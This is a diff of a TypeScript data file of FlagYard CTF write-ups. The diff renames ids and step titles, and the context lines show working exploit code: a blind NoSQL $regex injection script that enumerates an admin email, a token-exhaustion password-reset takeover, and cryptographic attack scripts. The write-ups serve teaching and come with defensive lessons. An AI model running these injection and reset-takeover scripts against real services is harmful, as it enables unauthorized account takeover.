@@ -2,7 +2,7 @@ import type { WriteUp } from "../types";
 
 export const flagyardWriteups: WriteUp[] = [
   {
-    "id": "9",
+    "id": "flagyard-web-pooking",
     "title": "Pooking",
     "category": "Web",
     "difficulty": "Medium",
@@ -22,29 +22,29 @@ export const flagyardWriteups: WriteUp[] = [
     "analysis": "Security analysis reveals four critical vulnerabilities chained together in the API implementation:\n\n**Vulnerability 1: Blind NoSQL Injection on /api/forgot-password**\n\nThe endpoint accepts an email parameter that is directly interpolated into MongoDB queries without sanitization. By sending operator objects with regex patterns in the JSON payload, an attacker can perform regex-based queries. Each request returns either 200 OK (match found) or 404 Not Found (no match), creating a response-based oracle allowing character-by-character enumeration of usernames.\n\n**Vulnerability 2: Insufficient Token Validation on /api/reset-password**\n\nThe password reset endpoint accepts a token field in the request body, which is directly used in a MongoDB filter condition without verification. An attacker can send wildcard regex patterns to match ANY token in the database, not just their own.\n\n**Vulnerability 3: Sequential Document Processing Flaw**\n\nMongoDB's findOne() method returns the first matching document in insertion order. When multiple tokens match the wildcard pattern, only the first document is updated. By repeatedly sending requests with the same wildcard token filter, an attacker exhausts tokens until reaching the target admin account.\n\n**Vulnerability 4: Sensitive Data Leakage in API Response**\n\nThe web UI does not display sensitive admin fields, but the backend leaks them directly in the JSON response from /api/login. The flag is embedded in the user object returned after successful authentication, discoverable only through raw HTTP response inspection.",
     "solution": [
       {
-        "title": "Step 1: Reconnaissance & Vulnerability Mapping",
+        "title": "Reconnaissance & Vulnerability Mapping",
         "content": "Analyze the web application to identify backend technology (MongoDB via ObjectID format 699c9327...) and API endpoints. Test basic NoSQL operators ($ne, $regex) against different endpoints to determine which is injectable."
       },
       {
-        "title": "Step 2: Email Enumeration via Blind NoSQL Injection",
+        "title": "Email Enumeration via Blind NoSQL Injection",
         "content": "Use the /api/forgot-password endpoint to enumerate admin email character-by-character. Send requests with {\"email\": {\"$regex\": \"^[charset]\"}} payloads. A 200 response indicates the character is present; 404 indicates it's not. Iterate through all possible characters in optimized order (digits first, then letters) to reconstruct the full email address.",
         "code": "import requests\nimport string\n\nBASE_URL = \"http://target:port/api/forgot-password\"\n\ndef check_email_prefix(prefix):\n    payload = {\"email\": {\"$regex\": f\"^{prefix}\"}}\n    response = requests.post(BASE_URL, json=payload)\n    return response.status_code == 200\n\nemail = \"\"\ncharset = string.digits + string.ascii_lowercase + \".-@\"\n\nfor pos in range(50):  # Max email length\n    for char in charset:\n        test_prefix = email + char\n        if check_email_prefix(test_prefix):\n            email = test_prefix\n            print(f\"[+] Found: {email}\")\n            break\n    else:\n        print(f\"[*] Email completed: {email}\")\n        break"
       },
       {
-        "title": "Step 3: Trigger Reset Token Generation",
+        "title": "Trigger Reset Token Generation",
         "content": "Once the admin email is identified (e.g., 4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com), trigger the forgot-password mechanism by requesting a password reset token. This causes the backend to generate and store a reset token in the admin's document."
       },
       {
-        "title": "Step 4: Token Exhaustion & Password Reset",
+        "title": "Token Exhaustion & Password Reset",
         "content": "Exploit the /api/reset-password endpoint with wildcard token matching. Send multiple requests with {\"token\": {\"$regex\": \"^.*\"}, \"newPassword\": \"HackedPassword123!\"} payload. Each request resets the password of the first user with a matching token. This sequentially burns through dummy account tokens until the admin account is reached, whose password is then forcibly changed to a value under attacker control.",
         "code": "import requests\nimport time\n\nBASE_URL = \"http://target:port/api/reset-password\"\nADMIN_EMAIL = \"4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com\"\nNEW_PASSWORD = \"HackedPassword123!\"\n\n# Token exhaustion loop\nfor attempt in range(1, 100):\n    payload = {\n        \"token\": {\"$regex\": \"^.*\"},\n        \"newPassword\": NEW_PASSWORD\n    }\n    \n    response = requests.post(BASE_URL, json=payload)\n    print(f\"[*] Attempt {attempt}: {response.status_code}\")\n    \n    if \"success\" in response.json():\n        print(f\"[+] Password reset successful!\")\n        break\n    \n    time.sleep(0.5)  # Small delay to avoid rate limiting"
       },
       {
-        "title": "Step 5: Admin Account Takeover & Login",
+        "title": "Admin Account Takeover & Login",
         "content": "With the admin password compromised, authenticate to /api/login using the known email and the new password. The backend will return a JSON response containing the admin user object with sensitive data including the hidden flag."
       },
       {
-        "title": "Step 6: Flag Extraction",
+        "title": "Flag Extraction",
         "content": "Examine the raw JSON response from the login endpoint. The flag is embedded in the user object returned by the server, not visible in the web UI. Extract the flag field from the API response.",
         "code": "curl -s -X POST http://target:port/api/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"email\": \"4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com\",\n    \"password\": \"HackedPassword123!\"\n  }' | jq '.user.flag'\n\n# Output: FlagY{9f4e47684e72251c97a092123b6176c1}"
       }
@@ -63,7 +63,7 @@ export const flagyardWriteups: WriteUp[] = [
     "lessonsLearned": "**Input Validation** - Never trust user input in database queries. Always use parameterized queries and proper input validation. NoSQL operators like $regex must be explicitly blocked in user-controlled parameters.\n\n**Token Management** - Password reset mechanisms are critical security components. Implement proper token validation (time-limited, single-use, cryptographically random) to prevent unauthorized access.\n\n**Query Security** - Query results should not rely on insertion order for security decisions. Always use explicit accountability mechanisms and verify users can only access their own data.\n\n**Data Exposure** - Sensitive data should never be exposed in API responses, even to authenticated users without explicit authorization. Implement proper field filtering based on user role.\n\n**Rate Limiting** - Implement rate limiting on authentication and password reset endpoints to prevent token exhaustion attacks and brute-force attempts.\n\n**Defense in Depth** - Combine input validation, proper query construction, and response sanitization to prevent information disclosure. Single-layer defenses are insufficient.\n\n**Optimization** - When exploiting APIs with many requests, implement parallel requests and smart enumeration strategies to accelerate the exploitation timeline."
   },
   {
-    "id": "11",
+    "id": "flagyard-web-subscriber",
     "title": "Subscriber",
     "category": "Web",
     "difficulty": "Hard",
@@ -147,7 +147,7 @@ export const flagyardWriteups: WriteUp[] = [
     "lessonsLearned": "**SQL Injection Prevention** - Never use string interpolation in SQL queries. Always use prepared statements with parameter binding to prevent SQL Injection attacks. Treated untrusted input as data, not code.\n\n**Database Extension Security** - Database extension features like load_extension() must be disabled in production environments. Restrict extension loading only to trusted administrators in controlled environments with proper auditing.\n\n**File Upload Validation** - File upload validation must not depend on a single defense layer. Implement multiple validation layers: extension whitelist, magic bytes verification, MIME type checking, and disable script execution in upload directories with proper server configuration.\n\n**Principle of Least Privilege** - Enable only the functionality required and disable everything unnecessary. SQLite enable_load_extension should be disabled by default in production deployments. Review all enabled features regularly.\n\n**Stateless Application Design** - Even though Flask is stateless, side effects from library loading can persist through the file system. Audit all initialization code in loaded extensions for unintended consequences and security implications.\n\n**Defense in Depth** - Multiple individually minor vulnerabilities can combine to create critical RCE. Secure development requires comprehensive security testing across all components and threat modeling of vulnerability chains."
   },
   {
-    "id": "13",
+    "id": "flagyard-pwn-got-me",
     "title": "GOT me",
     "category": "Pwn",
     "difficulty": "Easy",
@@ -223,7 +223,7 @@ export const flagyardWriteups: WriteUp[] = [
     "lessonsLearned": "**Format String Exploitation Precision** - Format string attacks require careful offset calculation and understanding of stack layout. Each write operation must be crafted to align with target memory locations and respect size constraints (128-byte limit in this case).\n\n**Partial RELRO Weakness** - Partial RELRO makes the GOT writable during program execution. This enables GOT hijacking, a powerful technique for redirecting control flow. Always prefer Full RELRO when possible to prevent such attacks.\n\n**Intel CET Awareness** - Modern CPU protections like Intel CET (SHSTK and IBT) require exploit developers to respect instruction boundaries. Landing at the correct function entry point (endbr64) is mandatory; jumping mid-function will cause immediate termination.\n\n**Multi-Stage Writes** - When dealing with size constraints, breaking large overwrites into multiple smaller writes (%hn for 2-byte writes) allows fitting exploits within payload limits while still achieving arbitrary writes.\n\n**Static Addresses for Exploitation** - Absence of PIE made this exploit straightforward. With PIE enabled, information disclosure (format string leak) would be needed first to locate win() before overwriting GOT.\n\n**Payload Alignment** - Careful padding and alignment of pointers in payload is essential. The format string and GOT pointers must be positioned precisely at the correct offsets for %11$hn, %12$hn, %13$hn to reference them correctly.\n\n**Defense in Depth Failure** - While Intel CET provides good protection against arbitrary control flow, it must work alongside other mitigations. No stack canary + Partial RELRO + static addresses = exploitable despite modern protections. Multiple complementary security layers are necessary."
   },
   {
-    "id": "14",
+    "id": "flagyard-crypto-normal-el-gamal",
     "title": "Normal El-Gamal (Elliptic Curve)",
     "category": "Crypto",
     "difficulty": "Hard",
@@ -265,34 +265,34 @@ export const flagyardWriteups: WriteUp[] = [
     ],
     "solution": [
       {
-        "title": "Step 1: Receive Target Ciphertext",
+        "title": "Receive Target Ciphertext",
         "content": "Connect to the online oracle and extract the flag ciphertext from the initial response. Parse the coordinates $(C_{1x}, C_{1y}, C_{2x}, C_{2y})$ which represent two points on the hidden curve."
       },
       {
-        "title": "Step 2: Collect Curve Points from Encryption Oracle",
+        "title": "Collect Curve Points from Encryption Oracle",
         "content": "Use the encryption menu (option 1) to encrypt small integers (1, 2, 3, ...). Each encryption returns a ciphertext $(C_1, C_2)$ consisting of two valid curve points. Collect at least 5 unique points with distinct x-coordinates to ensure reliable parameter recovery."
       },
       {
-        "title": "Step 3: Reconstruct Curve Equation",
+        "title": "Reconstruct Curve Equation",
         "content": "For each collected point $(x, y)$, compute $v = y^2 - x^3$. Using three consecutive points, form the equation $k = (v_1 - v_2)(x_2 - x_3) - (v_2 - v_3)(x_1 - x_2)$ and collect multiple $k$ values. Take the GCD of all $k$ values to recover the modulus $p$.",
         "code": "# From collected points, recover modulus\nvs = [y**2 - x**3 for x, y in unique_points]\nKs = []\n\nfor i in range(len(unique_points) - 2):\n    v1, v2, v3 = vs[i], vs[i+1], vs[i+2]\n    x1, x2, x3 = unique_points[i][0], unique_points[i+1][0], unique_points[i+2][0]\n    k = (v1 - v2)*(x2 - x3) - (v2 - v3)*(x1 - x2)\n    Ks.append(abs(k))\n\np = Ks[0]\nfor k in Ks[1:]:\n    p = math.gcd(p, k)"
       },
       {
-        "title": "Step 4: Recover Curve Parameters a and b",
+        "title": "Recover Curve Parameters a and b",
         "content": "Using any two distinct points $(x_1, y_1)$ and $(x_2, y_2)$ along with the recovered modulus $p$, solve for $a$ and $b$ using linear equations derived from the curve equation.",
         "code": "# Recover a and b using linear system\nx1, y1 = unique_points[0]\nx2, y2 = unique_points[1]\nv1, v2 = vs[0], vs[1]\n\n# From v1 = ax1 + b and v2 = ax2 + b\na = (v1 - v2) * pow(x1 - x2, -1, p) % p\nb = (v1 - a * x1) % p"
       },
       {
-        "title": "Step 5: Craft Malleability Payload",
+        "title": "Craft Malleability Payload",
         "content": "Select a known curve point $P_{pad}$ from ones we collected (e.g., unique_points[2]). Add this point to $C_2$ of the target ciphertext using elliptic curve addition to create $C_2' = C_2 + P_{pad}$.",
         "code": "def ec_add(P, Q, a, p):\n    if P == (0, 0): return Q\n    if Q == (0, 0): return P\n    x1, y1 = P\n    x2, y2 = Q\n    if x1 == x2:\n        return (0, 0) if y1 != y2 else ec_double(P, a, p)\n    \n    m = (y2 - y1) * pow(x2 - x1, -1, p) % p\n    x3 = (m**2 - x1 - x2) % p\n    y3 = (m * (x1 - x3) - y1) % p\n    return (x3, y3)\n\n# Craft modified ciphertext\nP_pad = unique_points[2]\nC2_prime = ec_add(C2_target, P_pad, a, p)"
       },
       {
-        "title": "Step 6: Bypass Decryption Filter",
+        "title": "Bypass Decryption Filter",
         "content": "Send the modified ciphertext $(C_1, C_2')$ to the decryption oracle. Since $M' \\neq$ target flag $M$, the server's equality check is bypassed and it decrypts successfully, returning the modified plaintext $M'$."
       },
       {
-        "title": "Step 7: Recover Original Plaintext",
+        "title": "Recover Original Plaintext",
         "content": "Subtract the padding point locally: $M = M' - P_{pad}$ using elliptic curve subtraction. Convert the resulting point's x-coordinate to the integer flag by removing the byte-length encoding prefix applied by the server.",
         "code": "def ec_sub(P, Q, a, p):\n    x, y = Q\n    return ec_add(P, (x, (-y) % p), a, p)\n\n# Recover original message\nM_target = ec_sub(M_prime, P_pad, a, p)\n\n# Convert point to flag integer\nflag_int = M_target[0] >> 8  # Remove length prefix\nflag = long_to_bytes(flag_int)\nprint(f\"FLAG: {flag.decode()}\")"
       },
@@ -306,7 +306,7 @@ export const flagyardWriteups: WriteUp[] = [
     "lessonsLearned": "**Hidden Parameter Assumption ≠ Security** - Concealing cryptographic parameters from the user does not strengthen the system if an encryption oracle is available. Parameters can be recovered through algebraic manipulation of plaintext-ciphertext pairs.\n\n**Integrity vs Confidentiality** - El-Gamal provides confidentiality but lacks built-in integrity guarantees. Without authenticated encryption (MAC/digital signature), ciphertexts remain malleable and can be transformed in predictable ways.\n\n**Oracle Access is Dangerous** - Encryption oracles that accept arbitrary plaintexts are high-risk. Carefully restrict oracle functionality to prevent parameter leakage and plaintext recovery attacks.\n\n**Filter Bypass via Transformation** - Security checks based on input-output equality can often be bypassed through homomorphic or malleable properties. Ensure checks operate on cryptographically authenticated values, not raw plaintexts.\n\n**Elliptic Curve Algebra** - Understanding point addition and scalar multiplication operations is crucial for ECC security analysis. Malleability often arises from the group structure itself.\n\n**Defense Strategy** - Use authenticated encryption schemes (ECIES with HMAC or similar), implement proper input validation, never rely on parameter obscurity, and prefer standardized cryptographic parameters with known security properties."
   },
   {
-    "id": "15",
+    "id": "flagyard-rev-cu29",
     "title": "CU29",
     "category": "Crypto",
     "difficulty": "Medium",
@@ -348,25 +348,25 @@ export const flagyardWriteups: WriteUp[] = [
     ],
     "solution": [
       {
-        "title": "Step 1: Reconstruct p+q Approximate Value",
+        "title": "Reconstruct p+q Approximate Value",
         "content": "The leaked pq value represents (p+q) >> 200. Restore the approximate sum by left-shifting 200 bits: S_approx = pq_val << 200"
       },
       {
-        "title": "Step 2: Compute Initial p Approximation",
+        "title": "Compute Initial p Approximation",
         "content": "Using the quadratic formula, compute: D = S_approx² - 4n, then Δ = √D. The initial approximation is: p_approx = (S_approx + Δ) / 2"
       },
       {
-        "title": "Step 3: Apply Coppersmith's Algorithm",
+        "title": "Apply Coppersmith's Algorithm",
         "content": "Create polynomial f(x) = x + p_approx in the ring Z_n[x]. Call SageMath's small_roots() to find the LSBs error x₀. The bound X = 2^205 accounts for ~200 missing bits plus tolerance.",
         "code": "PR.<x> = PolynomialRing(Zmod(n))\nf = x + p_approx\nroots = f.small_roots(X=2^205, beta=0.5, epsilon=0.03)\np_diff = int(roots[0])\np = p_approx + p_diff\nq = n // p"
       },
       {
-        "title": "Step 4: Compute e-th Roots Modulo p and q",
+        "title": "Compute e-th Roots Modulo p and q",
         "content": "Since gcd(e, φ(n)) > 1, decrypt separately modulo each prime. Find all e-th roots of c modulo p and q using nth_root() method which returns all solutions.",
         "code": "P_ring = Zmod(p)\nQ_ring = Zmod(q)\ncp = P_ring(c)\ncq = Q_ring(c)\nmp_roots = cp.nth_root(e, all=True)\nmq_roots = cq.nth_root(e, all=True)"
       },
       {
-        "title": "Step 5: Combine Roots Via CRT",
+        "title": "Combine Roots Via CRT",
         "content": "For each pair (m_p, m_q) from the Cartesian product of root sets, use the Chinese Remainder Theorem to recover candidate plaintexts m. Check which candidate contains the flag marker 'FlagY{'.",
         "code": "for mp in mp_roots:\n    for mq in mq_roots:\n        m = crt([int(mp), int(mq)], [p, q])\n        flag_candidate = long_to_bytes(int(m))\n        if b\"FlagY{\" in flag_candidate:\n            print(flag_candidate.decode())"
       },
@@ -386,7 +386,7 @@ export const flagyardWriteups: WriteUp[] = [
     "lessonsLearned": "**Partial Bit Leakage is Critical** - Leaking even the MSBs of sensitive values like p+q creates exploitable approximations. Combined with Coppersmith's algorithm, 200 missing bits can be recovered efficiently. Always protect prime sums and related values.\n\n**Coppersmith's Theorem is Powerful** - When you have an approximation within 2^(1/d) relative error, polynomial root finding in modular arithmetic recovers the exact value. This breaks RSA with partial p or q leakage.\n\n**Non-Coprime Exponents Break RSA** - The standard decryption formula d ≡ e^(-1) (mod φ(n)) fails when gcd(e, φ(n)) ≠ 1. Secure RSA requires e to be coprime with φ(n). Use safe primes or validate this condition.\n\n**Red Herrings in CTF** - Parameters like small d and ee were designed to distract from the real vulnerability (bit leakage). Focus on information that servers shouldn't leak rather than chasing advanced attacks when simpler ones work.\n\n**CRT for Multiple Candidates** - When decryption yields multiple valid plaintexts (due to non-coprimality), CRT efficiently combines n candidates into n checks. Brute-forcing with a recognizable marker (like 'FlagY{') quickly identifies the correct plaintext.\n\n**Defense Strategy** - Never leak (p+q) >> k for any small k. Use coprime exponents (e.g., e = 65537). Implement proper input validation to ensure gcd(e, φ(n)) = 1 before accepting RSA keys."
   },
   {
-    "id": "16",
+    "id": "flagyard-crypto-moving-supersingular",
     "title": "Moving Supersingular",
     "category": "Crypto",
     "difficulty": "Hard",
@@ -425,31 +425,31 @@ export const flagyardWriteups: WriteUp[] = [
     ],
     "solution": [
       {
-        "title": "Step 1: Identify Curve Parameters",
+        "title": "Identify Curve Parameters",
         "content": "Extract the elliptic curve parameters (p, a, b) provided in the challenge. Verify the curve is supersingular using SageMath's .is_supersingular() method."
       },
       {
-        "title": "Step 2: Setup Curve and Generator",
+        "title": "Setup Curve and Generator",
         "content": "Initialize the elliptic curve E over GF(p) with the given coefficients. Identify the generator point G and compute its order n.",
         "code": "E = EllipticCurve(GF(p), [a, b])\nG = E.gens()[0]\nn = G.order()"
       },
       {
-        "title": "Step 3: Create Field Extension GF(p²)",
+        "title": "Create Field Extension GF(p²)",
         "content": "Create the quadratic extension field GF(p²) where pairing results live. Extend the curve to E₂ over the extension field.",
         "code": "K2.<z> = GF(p^2)\nE2 = E.base_extend(K2)\nG2 = E2(G)"
       },
       {
-        "title": "Step 4: Find Auxiliary Pairing Point",
+        "title": "Find Auxiliary Pairing Point",
         "content": "Select a random point P_aux on the extended curve E₂ such that the pairing e(G, P_aux) ≠ 1 and has order n.",
         "code": "while True:\n    P_aux = E2.random_point()\n    u = G2.tate_pairing(P_aux, n, 2)\n    if u != 1 and u^n == 1:\n        break"
       },
       {
-        "title": "Step 5: MOV Attack - Convert ECDLP to DLP",
+        "title": "MOV Attack - Convert ECDLP to DLP",
         "content": "For each challenge point Q, compute the Tate pairing v = e(Q, P_aux). The relationship v = u^s holds where u = e(G, P_aux). Solve for s using standard DLP.",
         "code": "def solve_dlp(Q_challenge):\n    Q_ext = E2(Q_challenge)\n    v = Q_ext.tate_pairing(P_aux, n, 2)\n    return v.log(u)"
       },
       {
-        "title": "Step 6: Recover All Flag Segments",
+        "title": "Recover All Flag Segments",
         "content": "Apply the DLP solver to each challenge point. Convert each recovered scalar s_i to a 12-byte value and concatenate all segments to recover the flag. Complete solve script:",
         "code": "#!/usr/bin/env sage\n# MOV Attack on Supersingular Elliptic Curve\n# Challenge: Flagyard CTF - Moving Supersingular\n\n# Input parameters from challenge\np = 71323803796758910290373490389\na = 0\nb = 1\n\n# Step 1: Setup curve\nprint(\"[*] Setting up elliptic curve...\")\nE = EllipticCurve(GF(p), [a, b])\nprint(f\"[*] Apakah Supersingular? {E.is_supersingular()}\")\n\n# Get generator point\nG = E.gens()[0]\nn = G.order()\nprint(f\"[*] Order grup n: {n}\")\nprint(f\"[*] Karakteristik p: {p}\")\n\n# Step 2: Create extension field GF(p^2)\nprint(f\"[*] Setting up extension field GF(p^2)...\")\nK2.<z> = GF(p^2)\nE2 = E.base_extend(K2)\nG2 = E2(G)\n\n# Step 3: Find auxiliary point for pairing\nprint(f\"[*] Finding auxiliary point for pairing...\")\nwhile True:\n    P_aux = E2.random_point()\n    u = G2.tate_pairing(P_aux, n, 2)\n    if u != 1 and u^n == 1:\n        print(f\"[+] Pairing base 'u' found. Starting DLP...\")\n        break\n\n# Step 4: Define DLP solver\ndef solve_dlp(Q_challenge, description=\"\"):\n    Q_ext = E2(Q_challenge)\n    v = Q_ext.tate_pairing(P_aux, n, 2)\n    print(f\"[*] Solving for {description}...\")\n    s = v.log(u)\n    label = description.replace('Q', 's')\n    print(f\"[+] Found {label}: {s}\")\n    return s\n\n# Challenge points from problem\nQ1 = E(...)  # Challenge point 1\nQ2 = E(...)  # Challenge point 2\n\n# Step 5: Solve for all secret scalars\ns1 = solve_dlp(Q1, \"Q1\")\ns2 = solve_dlp(Q2, \"Q2\")\n\n# Step 6: Recover flag\nfrom Crypto.Util.number import long_to_bytes\nflag_bytes = long_to_bytes(int(s1)).rjust(12, b'\\x00') + long_to_bytes(int(s2)).rjust(12, b'\\x00')\nflag = flag_bytes.decode().strip()\nprint(f\"\\n[!] FLAG: {flag}\")"
       }
